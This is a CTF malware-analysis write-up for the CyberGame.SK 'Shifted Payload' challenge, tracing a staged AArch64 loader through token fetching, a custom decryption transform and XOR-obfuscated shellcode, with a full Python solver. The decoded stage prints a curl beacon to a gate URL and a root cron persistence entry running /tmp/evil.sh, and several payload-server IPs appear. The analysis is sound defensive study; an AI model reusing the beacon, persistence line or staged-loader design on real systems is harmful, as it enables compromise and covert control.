---
title: "Shifted Payload"
summary: "CyberGame.SK cybergame sk, reverse engineering, malware analysis writeup covering Shifted Payload with analysis, solution steps, and final recovery notes."
date: 2026-05-02
tags:
  - ctf
  - cybergame-sk
  - reverse-engineering
  - malware-analysis
  - binary-exploitation
  - network
category: "international-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://scontent.fkul11-2.fna.fbcdn.net/v/t39.30808-1/638315334_912211214722245_1753300060671872827_n.jpg?stp=dst-jpg_tt6&cstp=mx180x180&ctp=s180x180&_nc_cat=105&ccb=1-7&_nc_sid=2d3e12&_nc_ohc=tmZZ3tgT6bwQ7kNvwGoDB83&_nc_oc=AdoJZqRKxReRj76CRTP46td-B7AaAkrMrDS2ghidHSGCPZQNz6wXSKnMjvyeQ-UJgSHUwYcx5DrUHcoHmVsz8zFB&_nc_zt=24&_nc_ht=scontent.fkul11-2.fna&_nc_gid=y1Q08Jq9DhDlqGjKjQUDEg&_nc_ss=7b289&oh=00_Af_Ow3s347ZkjkRHjGV77tVd8INvQ45jyBC3iw6yTuzRqA&oe=6A3ACF21"
---
## 1. Challenge Overview

**Challenge:** Shifted Payload
**Category:** Malware Analysis / Reverse Engineering
**Points:** 467
**Goal:** Recover the final C2 server or flag from a provided malware sample named `less`.

The challenge description says:

> Our server was hacked. We have found the sample but not the final C2 server.

The sample is a staged malware loader. The first binary does not directly contain the final flag. Instead, it contacts a staging endpoint, receives a shifted token, decrypts a payload URL, downloads a second stage, and the second stage contains the final flag.

---

## 2. Reconnaissance and Initial Observations

Initial triage commands:

```bash
file less
strings -a less | grep -Ei 'http|payload|TracerPid|vmware|proc|cybergame'
readelf -h less
```

Important observations:

```text
ELF 64-bit LSB PIE executable
Architecture: AArch64 / ARM64
Language style: Rust-like binary
Stripped: yes
```

Interesting strings found in the sample:

```text
exp.cybergame.sk:7060
/proc/self/status
TracerPid
/sys/class/dmi/id/
vmware
vmtoolsd
```

This suggested:

1. The binary performs anti-debugging checks using `TracerPid`.

2. It checks for virtualization artifacts.

3. It connects to `exp.cybergame.sk:7060`.

4. The final C2 is not directly visible through `strings`.


The first recovered token was 31 bytes:

```text
au7Fg8cdLMnoqplhTdveiFFUEtYtt0d
```

Dropping the first byte produced the shifted key:

```text
u7Fg8cdLMnoqplhTdveiFFUEtYtt0d
```

Using this key decrypted one payload URL:

```text
http://51.75.170.168:7050/payload
```

However, that host refused connections, showing that the payload server rotates or expires. A later fresh token decrypted to another payload server, which successfully served `payload.raw`.

---

## 3. Technical Analysis

The malware works in multiple stages.

### Stage 1: Token Fetching

The sample contacts:

```text
exp.cybergame.sk:7060
```

The server returns a 31-byte token. Example:

```text
ajvMF4kdZhtsZ287EZex9bAW6eCAOqF
```

The challenge name **Shifted Payload** hints at the important trick:

```python
shifted_key = token[1:]
```

So the first byte is discarded.

Example:

```text
raw token   : ajvMF4kdZhtsZ287EZex9bAW6eCAOqF
shifted key : jvMF4kdZhtsZ287EZex9bAW6eCAOqF
```

### Stage 2: Payload URL Decryption

The shifted key is used with a custom reversible transform. This transform uses:

- FNV-1a 64-bit hashing

- byte rotations

- nibble swapping

- deterministic byte shuffling


After decrypting embedded blobs from the binary, one blob becomes a payload URL.

Example recovered URL:

```text
http://212.227.246.142:7050/payload
```

Another successful attempt recovered:

```text
http://195.168.112.4:7050/payload
```

The payload server returns an 864-byte binary blob named `payload.raw`.

### Stage 3: Second Stage Decryption

The payload is decrypted using:

```python
stage2_key = malware_transform(CONST_KEY, shifted_key)
stage2     = malware_transform(stage2_key, payload_raw)
```

The result is `stage2.bin`, a raw AArch64 shellcode blob.

Running `strings` on it does not reveal the flag:

```bash
strings -a stage2.bin | grep -Ei 'SK-CERT|http|https'
```

No useful result appears because the strings are created at runtime using XOR obfuscation.

### Stage 4: AArch64 Shellcode Analysis

Disassembling the second stage:

```bash
aarch64-linux-gnu-objdump -D -b binary -m aarch64 stage2.bin | tee stage2.asm
grep -n "svc" stage2.asm -B 15 -A 8
```

Important pattern:

```asm
mov     x14, #0x42
ldrb    w13, [x11]
eor     w13, w13, w14
strb    w13, [x11], #1
```

This shows that the second stage builds strings on the stack and XOR-decodes them using key `0x42`.

The shellcode uses Linux AArch64 syscalls:

```text
x8 = 0x38  openat
x8 = 0x40  write
x8 = 0x39  close
x8 = 0x5d  exit
```

The disassembly confirms repeated XOR loops and syscall usage.

After decoding the stack strings, the second stage reveals:

```bash
#!/bin/bash
curl -s 'http://exp.cybergame.sk/gate?f=SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}'
```

It also attempts to create persistence through a cron entry:

```text
* * * * * root /bin/bash /tmp/evil.sh
```

The malware should not be executed directly. Static analysis is enough.

---

## 4. Root Cause / Vulnerability

The weakness is the malware’s reliance on reversible client-side obfuscation.

The malware tries to hide the final payload using:

1. A public staging server.

2. A shifted token.

3. A custom encryption-like transform.

4. XOR-obfuscated shellcode strings.


However, all decoding logic is inside the provided sample. Because the analyst controls the binary and can inspect the algorithm, the full chain can be reconstructed without executing the malware.

In simple terms:

```text
The secret is hidden, but the decryption method is shipped together with the malware.
```

---

## 5. Exploitation Plan

The solution path:

1. Identify the binary format with `file`.

2. Extract useful strings with `strings`.

3. Find the staging endpoint `exp.cybergame.sk:7060`.

4. Connect to the endpoint and receive a token.

5. Drop the first byte of the token.

6. Use the shifted key to decrypt embedded blobs.

7. Recover the rotating `/payload` URL.

8. Download `payload.raw`.

9. Decrypt `payload.raw` into `stage2.bin`.

10. Disassemble `stage2.bin` as raw AArch64 shellcode.

11. Identify XOR `0x42` string decoding.

12. Emulate the shellcode string writes safely.

13. Extract the final flag from the decoded script.


---

## 6. Proof of Concept

Minimal proof that stage2 hides strings using XOR `0x42`:

```python
encoded = bytes([ord(c) ^ 0x42 for c in "/tmp/evil.sh"])
decoded = bytes(b ^ 0x42 for b in encoded)

print(decoded.decode())
```

Output:

```text
/tmp/evil.sh
```

This is the same logic used by the second stage when it builds `/tmp/evil.sh`, the curl command, and the cron entry.

---

## 7. Full Python Exploit / Solver

Save this as:

```bash
solve.py
```

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


MASK = (1 << 64) - 1

FNV0 = 0xCBF29CE484222325
FNV_PRIME = 0x100000001B3

A = 0x5851F42D4C957F2D
B = 0x14057B7EF767814F
C = 0x27BB2EE687B0B0FD
D = 0x00000000B504F32D

CONST_KEY = b"8uFbH0RBziKVOBrOBKPE4ICW9qpbCM"

# Encrypted blob locations inside the provided sample.
# These offsets were recovered from static analysis of the malware binary.
BLOB_SPECS = [
    (0x212370, 32, bytes([0x58, 0x2E, 0xA0])),
    (0x212390, 32, b""),
    (0x2123B0, 32, bytes([0x02])),
    (0x2123D0, 32, bytes([0x9B])),
]

URL_RE = re.compile(rb"https?://[^\s'\"<>]+")
FLAG_RE = re.compile(rb"SK-CERT\{[^}\r\n]+\}")


def fnv1a64(data: bytes) -> int:
    h = FNV0
    for b in data:
        h = ((h ^ b) * FNV_PRIME) & MASK
    return h


def ror8(v: int, r: int) -> int:
    v &= 0xFF
    r &= 7
    if r == 0:
        return v
    return ((v >> r) | ((v << (8 - r)) & 0xFF)) & 0xFF


def swap_nibbles(v: int) -> int:
    return ((v >> 4) | ((v << 4) & 0xFF)) & 0xFF


def malware_transform(key: bytes, data: bytes) -> bytes:
    """
    Custom reversible transform recovered from the malware.
    It uses FNV-1a, deterministic shuffling, byte rotation, and nibble swapping.
    """
    out = bytearray(data)
    n = len(out)

    if n == 0:
        return b""

    seed = fnv1a64(key)
    x = seed

    for i in range(n):
        x = ((x * A + B) & MASK) ^ i

    x ^= n

    pairs: list[tuple[int, int]] = []

    for idx in range(2 * n):
        left = idx % n
        x = (x * C + D) & MASK
        right = ((idx + x + left) & MASK) % n
        pairs.append((left, right))

    for left, right in reversed(pairs):
        out[left], out[right] = out[right], out[left]

    x = seed
    shift = 8

    for i in range(n):
        cur = (x >> (shift & 0x38)) & 0xFF
        prev = (x >> ((shift - 8) & 0x38)) & 0xFF

        val = (out[i] ^ ((cur + i) & 0xFF)) & 0xFF
        val = ror8(val, prev & 7)
        out[i] = swap_nibbles(val)

        x = ((x * A + B) & MASK) ^ i
        shift += 8

    return bytes(out)


def fetch_token(host: str, port: int, timeout: float) -> bytes:
    """
    Connect to the first-stage C2 and receive the shifted token.
    """
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        chunks = []

        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break

            if not chunk:
                break

            chunks.append(chunk)

    token = b"".join(chunks).strip()

    if len(token) < 2:
        raise RuntimeError(f"received invalid token: {token!r}")

    return token


def extract_encrypted_blobs(binary_path: Path) -> list[bytes]:
    data = binary_path.read_bytes()
    blobs = []

    for off, size, suffix in BLOB_SPECS:
        if off + size > len(data):
            raise RuntimeError(f"blob offset out of range: 0x{off:x}")

        blobs.append(data[off:off + size] + suffix)

    return blobs


def recover_payload_urls(binary_path: Path, shifted_key: bytes) -> list[str]:
    urls: list[str] = []

    for blob in extract_encrypted_blobs(binary_path):
        decoded = malware_transform(shifted_key, blob)

        for match in URL_RE.findall(decoded):
            url = match.decode("ascii", errors="replace")
            if url not in urls:
                urls.append(url)

    return urls


def download_payload(url: str, timeout: float) -> bytes:
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Mozilla/5.0",
        },
    )

    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()


def decrypt_stage2(shifted_key: bytes, payload: bytes) -> bytes:
    stage2_key = malware_transform(CONST_KEY, shifted_key)
    return malware_transform(stage2_key, payload)


def run_objdump(stage2_path: Path) -> list[tuple[int, str]]:
    objdump = shutil.which("aarch64-linux-gnu-objdump")

    if not objdump:
        raise RuntimeError(
            "aarch64-linux-gnu-objdump not found. Install it with: "
            "sudo apt install -y binutils-aarch64-linux-gnu"
        )

    cmd = [
        objdump,
        "-D",
        "-b",
        "binary",
        "-m",
        "aarch64",
        str(stage2_path),
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, check=True)

    instructions: list[tuple[int, str]] = []

    line_re = re.compile(r"^\s*([0-9a-f]+):\s+[0-9a-f]{8}\s+(.+)$")

    for line in result.stdout.splitlines():
        m = line_re.match(line)
        if not m:
            continue

        addr = int(m.group(1), 16)
        asm = m.group(2).split("//", 1)[0].strip()

        if asm:
            instructions.append((addr, asm))

    return instructions


def parse_imm(text: str) -> int:
    text = text.strip()
    text = text.replace("#", "")
    return int(text, 0)


def emulate_stage2_writes(stage2_path: Path) -> bytes:
    """
    Safely emulate only the small instruction subset needed for this shellcode.

    We do not execute the malware.
    We only emulate stack string construction and capture buffers passed to write().
    """
    instructions = run_objdump(stage2_path)
    addr_to_index = {addr: i for i, (addr, _) in enumerate(instructions)}

    regs: dict[str, int] = {"sp": 0x100000}
    mem: dict[int, int] = {}
    writes: list[bytes] = []

    zflag = False
    pc = 0

    def norm_reg(reg: str) -> str:
        reg = reg.strip()
        if reg.startswith("w") and reg[1:].isdigit():
            return "x" + reg[1:]
        return reg

    def get_reg(reg: str) -> int:
        reg = reg.strip()

        if reg in ("xzr", "wzr"):
            return 0

        if reg.startswith("w") and reg[1:].isdigit():
            return regs.get("x" + reg[1:], 0) & 0xFFFFFFFF

        return regs.get(reg, 0) & MASK

    def set_reg(reg: str, value: int) -> None:
        reg = reg.strip()

        if reg in ("xzr", "wzr"):
            return

        if reg.startswith("w") and reg[1:].isdigit():
            regs["x" + reg[1:]] = value & 0xFFFFFFFF
        else:
            regs[reg] = value & MASK

    def mem_write(addr: int, data: bytes) -> None:
        for i, b in enumerate(data):
            mem[addr + i] = b

    def mem_read(addr: int, size: int) -> bytes:
        return bytes(mem.get(addr + i, 0) for i in range(size))

    def parse_mem_operand(op: str) -> tuple[str, int]:
        """
        Supports:
            [sp]
            [sp, #8]
            [x11]
        """
        op = op.strip()

        m = re.match(r"\[([a-z0-9]+)\]$", op)
        if m:
            return m.group(1), 0

        m = re.match(r"\[([a-z0-9]+),\s*#(0x[0-9a-f]+|\d+)\]$", op)
        if m:
            return m.group(1), int(m.group(2), 0)

        raise RuntimeError(f"unsupported memory operand: {op}")

    while pc < len(instructions):
        addr, asm = instructions[pc]
        jumped = False

        try:
            # sub sp, sp, #0x10
            m = re.match(r"sub\s+sp,\s*sp,\s*#(0x[0-9a-f]+|\d+)$", asm)
            if m:
                regs["sp"] = (regs["sp"] - int(m.group(1), 0)) & MASK

            # mov x10, #0x366d
            elif m := re.match(r"mov\s+([xw][0-9]+|sp),\s*#(0x[0-9a-f]+|\d+)$", asm):
                set_reg(m.group(1), int(m.group(2), 0))

            # mov x11, sp
            # mov x19, x0
            # mov x14, xzr
            elif m := re.match(r"mov\s+([xw][0-9]+|sp),\s*([xw][0-9]+|sp|xzr|wzr)$", asm):
                set_reg(m.group(1), get_reg(m.group(2)))

            # movk x10, #0x322f, lsl #16
            elif m := re.match(
                r"movk\s+(x[0-9]+),\s*#(0x[0-9a-f]+|\d+),\s*lsl\s*#(\d+)$",
                asm,
            ):
                reg = m.group(1)
                imm = int(m.group(2), 0)
                shift = int(m.group(3), 0)
                old = get_reg(reg)
                mask = ~(0xFFFF << shift) & MASK
                set_reg(reg, (old & mask) | ((imm & 0xFFFF) << shift))

            # str x10, [sp]
            # str x10, [sp, #8]
            elif m := re.match(r"str\s+(x[0-9]+),\s*(\[.+\])$", asm):
                src = m.group(1)
                base, off = parse_mem_operand(m.group(2))
                addr2 = (get_reg(base) + off) & MASK
                mem_write(addr2, struct.pack("<Q", get_reg(src)))

            # ldrb w13, [x11]
            elif m := re.match(r"ldrb\s+(w[0-9]+),\s*(\[.+\])$", asm):
                dst = m.group(1)
                base, off = parse_mem_operand(m.group(2))
                addr2 = (get_reg(base) + off) & MASK
                set_reg(dst, mem.get(addr2, 0))

            # eor w13, w13, w14
            # eor x10, x14, x10
            elif m := re.match(r"eor\s+([xw][0-9]+),\s*([xw][0-9]+),\s*([xw][0-9]+)$", asm):
                dst, a, b = m.groups()
                set_reg(dst, get_reg(a) ^ get_reg(b))

            # strb w13, [x11], #1
            elif m := re.match(r"strb\s+(w[0-9]+),\s*\[([x0-9]+)\],\s*#(0x[0-9a-f]+|\d+)$", asm):
                src, base, inc = m.groups()
                addr2 = get_reg(base)
                mem[addr2] = get_reg(src) & 0xFF
                set_reg(base, addr2 + int(inc, 0))

            # subs x12, x12, #0x1
            elif m := re.match(r"subs\s+(x[0-9]+),\s*(x[0-9]+),\s*#(0x[0-9a-f]+|\d+)$", asm):
                dst, src, imm = m.groups()
                value = (get_reg(src) - int(imm, 0)) & MASK
                set_reg(dst, value)
                zflag = value == 0

            # b.ne 0x38
            elif m := re.match(r"b\.ne\s+0x([0-9a-f]+)$", asm):
                target = int(m.group(1), 16)
                if not zflag:
                    pc = addr_to_index[target]
                    jumped = True

            # svc #0x0
            elif asm.startswith("svc"):
                syscall = get_reg("x8")

                # openat
                if syscall == 56:
                    set_reg("x0", 3)

                # write
                elif syscall == 64:
                    buf = get_reg("x1")
                    size = get_reg("x2")
                    writes.append(mem_read(buf, size))

                # close
                elif syscall == 57:
                    pass

                # exit
                elif syscall == 93:
                    break

            # Unsupported instructions are ignored only if not relevant.
            else:
                pass

        except Exception as e:
            raise RuntimeError(f"emulation failed at 0x{addr:x}: {asm}: {e}") from e

        if not jumped:
            pc += 1

    return b"\n".join(writes)


def extract_flag(data: bytes) -> str | None:
    m = FLAG_RE.search(data)
    if not m:
        return None
    return m.group(0).decode("ascii", errors="replace")


def solve_once(args: argparse.Namespace, attempt: int) -> str | None:
    binary_path = Path(args.binary)

    print(f"\n=== attempt {attempt} ===")

    token = fetch_token(args.host, args.port, args.timeout)
    Path("stage_response.raw").write_bytes(token)

    shifted_key = token[1:]

    print(f"[+] raw token    : {token!r}")
    print(f"[+] shifted key  : {shifted_key!r}")

    urls = recover_payload_urls(binary_path, shifted_key)

    if not urls:
        print("[-] no payload URL recovered")
        return None

    print("[+] recovered payload URL(s):")
    for url in urls:
        print(f"    {url}")

    for url in urls:
        try:
            print(f"[*] downloading payload: {url}")
            payload = download_payload(url, args.timeout)
            Path("payload.raw").write_bytes(payload)
            print(f"[+] saved payload.raw ({len(payload)} bytes)")

            stage2 = decrypt_stage2(shifted_key, payload)
            Path("stage2.bin").write_bytes(stage2)
            print(f"[+] saved stage2.bin ({len(stage2)} bytes)")

            decoded_writes = emulate_stage2_writes(Path("stage2.bin"))
            Path("stage2_decoded_writes.txt").write_bytes(decoded_writes)

            print("[+] decoded stage2 writes:")
            print(decoded_writes.decode("utf-8", errors="replace"))

            flag = extract_flag(decoded_writes)

            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag

            print("[-] no flag found in decoded stage2 writes")

        except (urllib.error.URLError, TimeoutError, OSError) as e:
            print(f"[!] failed with {url}: {e}")

    return None


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Solver for cybergame.sk Shifted Payload malware challenge"
    )

    parser.add_argument("binary", help="Path to the provided malware sample, e.g. ./less")
    parser.add_argument("--host", default="exp.cybergame.sk")
    parser.add_argument("--port", type=int, default=7060)
    parser.add_argument("--timeout", type=float, default=6)
    parser.add_argument("--attempts", type=int, default=100)
    parser.add_argument("--sleep", type=float, default=2)

    args = parser.parse_args()

    if not Path(args.binary).is_file():
        print(f"[-] binary not found: {args.binary}", file=sys.stderr)
        return 1

    for attempt in range(1, args.attempts + 1):
        try:
            flag = solve_once(args, attempt)
            if flag:
                return 0

        except KeyboardInterrupt:
            print("\n[!] stopped by user")
            return 130

        except Exception as e:
            print(f"[!] attempt failed: {e}")

        if attempt != args.attempts:
            time.sleep(args.sleep)

    print("[-] failed to recover flag after all attempts")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

---

## 8. Running the Solver

Install the AArch64 disassembler:

```bash
sudo apt update
sudo apt install -y binutils-aarch64-linux-gnu
```

Run the solver:

```bash
chmod +x solve.py
python3 solve.py ./less --attempts 100 --timeout 6 --sleep 2
```

Useful manual verification commands:

```bash
file less
strings -a less | grep -Ei 'cybergame|payload|TracerPid|vmware'

file payload.raw
file stage2.bin

aarch64-linux-gnu-objdump -D -b binary -m aarch64 stage2.bin | tee stage2.asm
grep -n "svc" stage2.asm -B 15 -A 8
```

---

## 9. Expected Output

Example successful output:

```text
=== attempt 1 ===
[+] raw token    : b'ajvMF4kdZhtsZ287EZex9bAW6eCAOqF'
[+] shifted key  : b'jvMF4kdZhtsZ287EZex9bAW6eCAOqF'
[+] recovered payload URL(s):
    http://212.227.246.142:7050/payload
[*] downloading payload: http://212.227.246.142:7050/payload
[+] saved payload.raw (864 bytes)
[+] saved stage2.bin (864 bytes)
[+] decoded stage2 writes:
#!/bin/bash
curl -s 'http://exp.cybergame.sk/gate?f=SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}'

* * * * * root /bin/bash /tmp/evil.sh

[+] FLAG: SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}
```

---

## 10. Flag

```text
SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}
```

---

## 11. Conclusion

The challenge used a staged malware chain:

```text
AArch64 Rust ELF
    ↓
connects to exp.cybergame.sk:7060
    ↓
receives shifted token
    ↓
drops first byte
    ↓
decrypts rotating payload URL
    ↓
downloads payload.raw
    ↓
decrypts stage2.bin
    ↓
statically decodes XOR 0x42 shellcode strings
    ↓
recovers flag
```

The main lesson is that malware obfuscation is not the same as encryption. Once the binary contains the decoding algorithm, a reverse engineer can reproduce the logic safely and recover the hidden configuration without running the malware.
